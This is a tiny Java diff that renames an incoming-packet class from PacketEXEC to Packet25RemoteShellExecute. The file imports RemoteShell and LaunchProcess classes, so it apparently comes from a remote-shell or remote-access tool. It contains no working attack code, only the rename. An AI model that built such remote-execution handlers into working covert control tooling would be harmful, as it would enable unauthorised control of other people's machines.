@@ -7,7 +7,7 @@ import com.redpois0n.LaunchProcess;
 import com.redpois0n.RemoteShell;
 
 
-public class PacketEXEC extends AbstractIncomingPacket {
+public class Packet25RemoteShellExecute extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
